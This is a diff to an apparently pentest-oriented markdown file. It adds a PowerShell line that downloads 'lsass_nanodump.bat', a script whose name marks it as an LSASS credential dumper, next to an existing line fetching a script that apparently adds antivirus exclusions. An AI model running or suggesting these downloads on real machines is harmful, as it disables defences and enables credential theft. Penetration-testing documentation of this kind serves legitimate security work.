@@ -2,6 +2,7 @@
 
 ```powershell
 Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/verify-then-trust/main/Add-TrustedFileExclusion.ps1" -OutFile "Add-TrustedFileExclusion.ps1" -UseBasicParsing
+Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/verify-then-trust/main/lsass_nanodump.bat" -OutFile "lsass_nanodump.bat" -UseBasicParsing
 ```
 
 ---
